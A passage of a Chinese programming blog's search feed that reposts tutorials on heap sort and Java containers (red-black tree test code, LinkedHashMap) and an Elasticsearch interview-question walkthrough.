class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 设置mDebugDelete=true,测试"删除函数"</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mDebugDelete<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>ilen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                tree<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 删除节点: %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"== 树的详细信息: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                tree<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 销毁二叉树</span>        tree<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>本文转载自: <a href="https://yq.aliyun.com/articles/669575" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆排序</title>
      <link href="/2019/01/23/suan-fa/pai-xu/dui-pai-xu/"/>
      <url>/2019/01/23/suan-fa/pai-xu/dui-pai-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p><strong>堆排序</strong></p><p>　　堆排序是利用<strong>堆</strong>这种数据结构而设计的一种排序算法，堆排序是一种<strong>选择排序，</strong>它的最坏，最好，平均时间复杂度均为O(nlogn)，它也是不稳定排序。首先简单了解下堆结构。</p><p><strong>堆</strong></p><p>　　<strong>堆是具有以下性质的完全二叉树：每个结点的值都大于或等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。如下图：</strong></p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217182750011-675658660.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217182750011-675658660.png" alt="img"></a></p><p>同时，我们对堆中的结点按层进行编号，将这种逻辑结构映射到数组中就是下面这个样子</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217182857323-2092264199.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217182857323-2092264199.png" alt="img"></a></p><p>该数组从逻辑上讲就是一个堆结构，我们用简单的公式来描述一下堆的定义就是：</p><p><strong>大顶堆：arr[i] &gt;= arr[2i+1] &amp;&amp; arr[i] &gt;= arr[2i+2]</strong>  </p><p><strong>小顶堆：arr[i] &lt;= arr[2i+1] &amp;&amp; arr[i] &lt;= arr[2i+2]</strong>  </p><p>ok，了解了这些定义。接下来，我们来看看堆排序的基本思想及基本步骤：</p><h2 id="堆排序基本思想及步骤"><a href="#堆排序基本思想及步骤" class="headerlink" title="堆排序基本思想及步骤"></a>堆排序基本思想及步骤</h2><blockquote><p>　　<strong>堆排序的基本思想是：将待排序序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点。将其与末尾元素进行交换，此时末尾就为最大值。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</strong></p></blockquote><p><strong>步骤一 构造初始堆。将给定无序序列构造成一个大顶堆（一般升序采用大顶堆，降序采用小顶堆)。</strong></p><p>　　a.假设给定无序序列结构如下</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217192038651-934327647.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217192038651-934327647.png" alt="img"></a></p><p>2.此时我们从最后一个非叶子结点开始（叶结点自然不用调整，第一个非叶子结点 arr.length/2-1=5/2-1=1，也就是下面的6结点），从左至右，从下至上进行调整。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217192209433-270379236.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217192209433-270379236.png" alt="img"></a></p><p>4.找到第二个非叶节点4，由于[4,9,8]中9元素最大，4和9交换。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217192854636-1823585260.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217192854636-1823585260.png" alt="img"></a></p><p>这时，交换导致了子根[4,5,6]结构混乱，继续调整，[4,5,6]中6最大，交换4和6。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217193347886-1142194411.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217193347886-1142194411.png" alt="img"></a></p><p>此时，我们就将一个无需序列构造成了一个大顶堆。</p><p><strong>步骤二 将堆顶元素与末尾元素进行交换，使末尾元素最大。然后继续调整堆，再将堆顶元素与末尾元素交换，得到第二大元素。如此反复进行交换、重建、交换。</strong></p><p>a.将堆顶元素9和末尾元素4进行交换</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161217194207620-1455153342.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161217194207620-1455153342.png" alt="img"></a></p><p>b.重新调整结构，使其继续满足堆定义</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218153110495-1280388728.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218153110495-1280388728.png" alt="img"></a></p><p>c.再将堆顶元素8与末尾元素5进行交换，得到第二大元素8.</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218152929339-1114983222.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218152929339-1114983222.png" alt="img"></a></p><p>后续过程，继续进行调整，交换，如此反复进行，最终使得整个序列有序</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/排序算法/1024555-20161218152348229-935654830.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/排序算法/1024555-20161218152348229-935654830.png" alt="img"></a></p><p>再简单总结下堆排序的基本思路：</p><p>　　<strong>a.将无需序列构建成一个堆，根据升序降序需求选择大顶堆或小顶堆;</strong></p><p>　　<strong>b.将堆顶元素与末尾元素交换，将最大元素”沉”到数组末端;</strong></p><p>　　<strong>c.重新调整结构，使其满足堆定义，然后继续交换堆顶元素与当前末尾元素，反复执行调整+交换步骤，直到整个序列有序。</strong></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> sortdemo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Created by chengxiao on 2016/12/17. * 堆排序demo */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HeapSort</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1.构建大顶堆</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>arr<span class="token punctuation">.</span>length<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//从第一个非叶子结点从下至上，从右至左调整结构</span>            <span class="token function">adjustHeap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>i<span class="token punctuation">,</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//2.调整堆结构+交换堆顶元素与末尾元素</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将堆顶元素与末尾元素进行交换</span>            <span class="token function">adjustHeap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重新对堆进行调整</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 调整大顶堆（仅是调整过程，建立在大顶堆已构建的基础上）     * @param arr     * @param i     * @param length     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">adjustHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先取出当前元素i</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>k<span class="token operator">=</span>k<span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//从i结点的左子结点开始，也就是2i+1处开始</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span>length <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果左子结点小于右子结点，k指向右子结点</span>                k<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">></span>temp<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果子节点大于父节点，将子节点值赋给父节点（不用进行交换）</span>                arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>                i <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将temp值放到最终的位置</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 交换元素     * @param arr     * @param a     * @param b     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>arr<span class="token punctuation">,</span><span class="token keyword">int</span> a <span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> temp<span class="token operator">=</span>arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>结果</p><pre><code>[1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>　　堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)…1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p><p>本文转载自：<a href="https://www.cnblogs.com/chengxiao/p/6129630.html" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BAT等一线大厂Elasticsearch面试题解读</title>
      <link href="/2019/01/22/mian-shi-xi-lie/bat-deng-yi-xian-da-han-elasticsearch-mian-shi-ti-jie-du/"/>
      <url>/2019/01/22/mian-shi-xi-lie/bat-deng-yi-xian-da-han-elasticsearch-mian-shi-ti-jie-du/</url>
      
        <content type="html"><![CDATA[<h1 id="BAT等一线大厂Elasticsearch面试题解读"><a href="#BAT等一线大厂Elasticsearch面试题解读" class="headerlink" title="BAT等一线大厂Elasticsearch面试题解读"></a>BAT等一线大厂Elasticsearch面试题解读</h1><h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><blockquote><p>git上发现了网友总结的Elasticsearch BAT大厂面试题。只有题目，部分有答案，但不全。 正好抽出一些时间一起梳理一下。</p><p>既然是面试题，每个人都会有自己的结合业务场景的答案，没有非常标准的答案。<br>欢迎大家留言拍砖指正。</p></blockquote><h3 id="1、elasticsearch了解多少，说说你们公司es的集群架构，索引数据大小，分片有多少，以及一些调优手段-。"><a href="#1、elasticsearch了解多少，说说你们公司es的集群架构，索引数据大小，分片有多少，以及一些调优手段-。" class="headerlink" title="1、elasticsearch了解多少，说说你们公司es的集群架构，索引数据大小，分片有多少，以及一些调优手段 。"></a>1、elasticsearch了解多少，说说你们公司es的集群架构，索引数据大小，分片有多少，以及一些调优手段 。</h3><p><code>面试官</code>：想了解应聘者之前公司接触的ES使用场景、规模，有没有做过比较大规模的索引设计、规划、调优。<br><code>解答</code>：<br>如实结合自己的实践场景回答即可。<br>比如：ES集群架构13个节点，索引根据通道不同共20+索引，根据日期，每日递增20+，索引：10分片，每日递增1亿+数据，<br>每个通道每天索引大小控制：150GB之内。</p><p>仅索引层面调优手段：</p><h4 id="1-1、设计阶段调优"><a href="#1-1、设计阶段调优" class="headerlink" title="1.1、设计阶段调优"></a>1.1、设计阶段调优</h4><ul><li>1）根据业务增量需求，采取基于日期模板创建索引，通过roll over API滚动索引；</li><li>2）使用别名进行索引管理；</li><li>3）每天凌晨定时对索引做force_merge操作，以释放空间；</li><li>4）采取冷热分离机制，热数据存储到SSD，提高检索效率；冷数据定期进行shrink操作，以缩减存储；</li><li>5）采取curator进行索引的生命周期管理；</li><li>6）仅针对需要分词的字段，合理的设置分词器；</li><li>7）Mapping阶段充分结合各个字段的属性，是否需要检索、是否需要存储等。 ……..</li></ul><h4 id="1-2、写入调优"><a href="#1-2、写入调优" class="headerlink" title="1.2、写入调优"></a>1.2、写入调优</h4><ul><li>1）写入前副本数设置为0；</li><li>2）写入前关闭refresh_interval设置为-1，禁用刷新机制；</li><li>3）写入过程中：采取bulk批量写入；</li><li>4）写入后恢复副本数和刷新间隔；</li><li>5）尽量使用自动生成的id。</li></ul><h4 id="1-3、查询调优"><a href="#1-3、查询调优" class="headerlink" title="1.3、查询调优"></a>1.3、查询调优</h4><ul><li>1）禁用wildcard；</li><li>2）禁用批量terms（成百上千的场景）；</li><li>3）充分利用倒排索引机制，能keyword类型尽量keyword；</li><li>4）数据量大时候，可以先基于时间敲定索引再检索；</li><li>5）设置合理的路由机制。</li></ul><h4 id="1-4、其他调优"><a href="#1-4、其他调优" class="headerlink" title="1.4、其他调优"></a>1.4、其他调优</h4><p>部署调优，业务调优等。</p><p>上面的提及一部分，面试者就基本对你之前的实践或者运维经验有所评估了。</p><h3 id="2、elasticsearch的倒排索引是什么"><a href="#2、elasticsearch的倒排索引是什么" class="headerlink" title="2、elasticsearch的倒排索引是什么"></a>2、elasticsearch的倒排索引是什么</h3><p><code>面试官</code>：想了解你对基础概念的认知。<br><code>解答</code>：通俗解释一下就可以。</p><p>传统的我们的检索是通过文章，逐个遍历找到对应关键词的位置。<br>而倒排索引，是通过分词策略，形成了词和文章的映射关系表，这种词典+映射表即为倒排索引。<br>有了倒排索引，就能实现<code>o（1）时间复杂度</code>的效率检索文章了，极大的提高了检索效率。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/Elasticsearch/2019011923160111.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/Elasticsearch/2019011923160111.png" alt="img"></a></p><p>学术的解答方式：</p><blockquote><p>倒排索引，相反于一篇文章包含了哪些词，它从词出发，记载了这个词在哪些文档中出现过，由两部分组成——词典和倒排表。</p></blockquote><p><code>加分项</code>：倒排索引的底层实现是基于：FST（Finite State Transducer）数据结构。<br>lucene从4+版本后开始大量使用的数据结构是FST。FST有两个优点：</p><ul><li>1）空间占用小。通过对词典中单词前缀和后缀的重复利用，压缩了存储空间；</li><li>2）查询速度快。O(len(str))的查询时间复杂度。</li></ul><h3 id="3、elasticsearch-索引数据多了怎么办，如何调优，部署"><a href="#3、elasticsearch-索引数据多了怎么办，如何调优，部署" class="headerlink" title="3、elasticsearch 索引数据多了怎么办，如何调优，部署"></a>3、elasticsearch 索引数据多了怎么办，如何调优，部署</h3><p><code>面试官</code>：想了解大数据量的运维能力。<br><code>解答</code>：索引数据的规划，应在前期做好规划，正所谓“设计先行，编码在后”，这样才能有效的避免突如其来的数据激增导致集群处理能力不足引发的线上客户检索或者其他业务受到影响。<br>如何调优，正如问题1所说，这里细化一下：</p><h4 id="3-1-动态索引层面"><a href="#3-1-动态索引层面" class="headerlink" title="3.1 动态索引层面"></a>3.1 动态索引层面</h4><p>基于<code>模板+时间+rollover api滚动</code>创建索引，举例：设计阶段定义：blog索引的模板格式为：blog_index_时间戳的形式，每天递增数据。</p><p>这样做的好处：不至于数据量激增导致单个索引数据量非常大，接近于上线2的32次幂-1，索引存储达到了TB+甚至更大。</p><p>一旦单个索引很大，存储等各种风险也随之而来，所以要提前考虑+及早避免。</p><h4 id="3-2-存储层面"><a href="#3-2-存储层面" class="headerlink" title="3.2 存储层面"></a>3.2 存储层面</h4><p><code>冷热数据分离存储</code>，热数据（比如最近3天或者一周的数据），其余为冷数据。<br>对于冷数据不会再写入新数据，可以考虑定期force_merge加shrink压缩操作，节省存储空间和检索效率。</p><h4 id="3-3-部署层面"><a href="#3-3-部署层面" class="headerlink" title="3.3 部署层面"></a>3.3 部署层面</h4><p>一旦之前没有规划，这里就属于应急策略。<br>结合ES自身的支持动态扩展的特点，动态新增机器的方式可以缓解集群压力，注意：如果之前主节点等<code>规划合理</code>，不需要重启集群也能完成动态新增的。</p><h3 id="4、elasticsearch是如何实现master选举的"><a href="#4、elasticsearch是如何实现master选举的" class="headerlink" title="4、elasticsearch是如何实现master选举的"></a>4、elasticsearch是如何实现master选举的</h3><p><code>面试官</code>：想了解ES集群的底层原理，不再只关注业务层面了。<br><code>解答</code>：<br>前置前提：</p><ul><li>1）只有候选主节点（master：true）的节点才能成为主节点。</li><li>2）最小主节点数（min_master_nodes）的目的是防止脑裂。</li></ul><p>这个我看了各种网上分析的版本和源码分析的书籍，云里雾里。<br>核对了一下代码，核心入口为findMaster，选择主节点成功返回对应Master，否则返回null。选举流程大致描述如下：</p><ul><li>第一步：确认候选主节点数达标，elasticsearch.yml设置的值discovery.zen.minimum_master_nodes；</li><li>第二步：比较：先判定是否具备master资格，具备候选主节点资格的优先返回；若两节点都为候选主节点，则id小的值会主节点。注意这里的id为string类型。</li></ul><p>题外话：获取节点id的方法。</p><pre><code>1GET /_cat/nodes?v&amp;h=ip,port,heapPercent,heapMax,id,name2ip        port heapPercent heapMax id   name3127.0.0.1 9300          39   1.9gb Hk9w Hk9wFwU</code></pre><h3 id="5、详细描述一下Elasticsearch索引文档的过程"><a href="#5、详细描述一下Elasticsearch索引文档的过程" class="headerlink" title="5、详细描述一下Elasticsearch索引文档的过程"></a>5、详细描述一下Elasticsearch索引文档的过程</h3><p><code>面试官</code>：想了解ES的底层原理，不再只关注业务层面了。<br><code>解答</code>：<br>这里的索引文档应该理解为文档写入ES，创建索引的过程。<br>文档写入包含：单文档写入和批量bulk写入，这里只解释一下：单文档写入流程。</p><p>记住官方文档中的这个图。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/Elasticsearch/20190119231620775.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/Elasticsearch/20190119231620775.png" alt="img"></a></p><p>第一步：客户写集群某节点写入数据，发送请求。（如果没有指定路由/协调节点，请求的节点扮演<code>路由节点</code>的角色。）</p><p>第二步：节点1接受到请求后，使用文档_id来确定文档属于分片0。请求会被转到另外的节点，假定节点3。因此分片0的主分片分配到节点3上。</p><p>第三步：节点3在主分片上执行写操作，如果成功，则将请求并行转发到节点1和节点2的副本分片上，等待结果返回。所有的副本分片都报告成功，节点3将向协调节点（节点1）报告成功，节点1向请求客户端报告写入成功。</p><p>如果面试官再问：第二步中的文档获取分片的过程？<br>回答：借助路由算法获取，路由算法就是根据路由和文档id计算目标的分片id的过程。</p><pre><code>1shard = hash(_routing) % (num_of_primary_shards)</code></pre><h3 id="6、详细描述一下Elasticsearch搜索的过程？"><a href="#6、详细描述一下Elasticsearch搜索的过程？" class="headerlink" title="6、详细描述一下Elasticsearch搜索的过程？"></a>6、详细描述一下Elasticsearch搜索的过程？</h3><p><code>面试官</code>：想了解ES搜索的底层原理，不再只关注业务层面了。<br><code>解答</code>：<br>搜索拆解为“query then fetch” 两个阶段。<br><strong>query阶段的目的</strong>：定位到位置，但不取。<br>步骤拆解如下：</p><ul><li>1）假设一个索引数据有5主+1副本 共10分片，一次请求会命中（主或者副本分片中）的一个。</li><li>2）每个分片在本地进行查询，结果返回到本地有序的优先队列中。</li><li>3）第2）步骤的结果发送到协调节点，协调节点产生一个全局的排序列表。</li></ul><p><strong>fetch阶段的目的</strong>：取数据。<br>路由节点获取所有文档，返回给客户端。</p><h3 id="7、Elasticsearch在部署时，对Linux的设置有哪些优化方法"><a href="#7、Elasticsearch在部署时，对Linux的设置有哪些优化方法" class="headerlink" title="7、Elasticsearch在部署时，对Linux的设置有哪些优化方法"></a>7、Elasticsearch在部署时，对Linux的设置有哪些优化方法</h3><p><code>面试官</code>：想了解对ES集群的运维能力。<br><code>解答</code>：</p><ul><li>1）关闭缓存swap;</li><li>2）堆内存设置为：Min（节点内存/2, 32GB）;</li><li>3)设置最大文件句柄数；</li><li>4）线程池+队列大小根据业务需要做调整；</li><li>5）磁盘存储raid方式——存储有条件使用RAID10，增加单节点性能以及避免单节点存储故障。</li></ul><h3 id="8、lucence内部结构是什么？"><a href="#8、lucence内部结构是什么？" class="headerlink" title="8、lucence内部结构是什么？"></a>8、lucence内部结构是什么？</h3><p><code>面试官</code>：想了解你的知识面的广度和深度。<br><code>解答</code>：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/Elasticsearch/20190119231637780.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/Elasticsearch/20190119231637780.png" alt="img"></a></p><p>Lucene是有索引和搜索的两个过程，包含索引创建，索引，搜索三个要点。可以基于这个脉络展开一些。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>看到题目后，感觉熟悉又陌生。真正要在面试的时候讲出来，需要<code>下一番功夫</code>深入理解。<br>为了<code>求证回答的相对准确性</code>，我翻看了源码、官方文档和部分有深度的博文。<br>Elasticsearch路还很长，别无他法，唯有死磕！</p><p>参考：请阅读原文查看。</p><p>本文转载自:  <a href="https://blog.csdn.net/laoyang360/article/details/86558214" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinkedHashSet and LinkedHashMap</title>
      <link href="/2019/01/21/java/java-rong-qi/linkedhashset-and-linkedhashmap/"/>
      <url>/2019/01/21/java/java-rong-qi/linkedhashset-and-linkedhashmap/</url>
      
        <content type="html"><![CDATA[<h1 id="LinkedHashSet-and-LinkedHashMap"><a href="#LinkedHashSet-and-LinkedHashMap" class="headerlink" title="LinkedHashSet and LinkedHashMap"></a>LinkedHashSet and LinkedHashMap</h1><h1 id="总体介绍"><a href="#总体介绍" class="headerlink" title="总体介绍"></a>总体介绍</h1><p>如果你已看过前面关于<em>HashSet</em>和<em>HashMap</em>，以及<em>TreeSet</em>和<em>TreeMap</em>的讲解，一定能够想到本文将要讲解的<em>LinkedHashSet</em>和<em>LinkedHashMap</em>其实也是一回事。<em>LinkedHashSet</em>和<em>LinkedHashMap</em>在Java里也有着相同的实现，前者仅仅是对后者做了一层包装，也就是说<em>LinkedHashSet里面有一个LinkedHashMap</em>（适配器模式）*<em>。因此本文将重点分析</em>LinkedHashMap*。</p><p><em>LinkedHashMap</em>实现了<em>Map</em>接口，即允许放入<code>key</code>为<code>null</code>的元素，也允许插入<code>value</code>为<code>null</code>的元素。从名字上可以看出该容器是<em>linked list</em>和<em>HashMap</em>的混合体，也就是说它同时满足<em>HashMap</em>和<em>linked list</em>的某些特性。<strong>可将LinkedHashMap看作采用linked list增强的HashMap。</strong></p><p><a 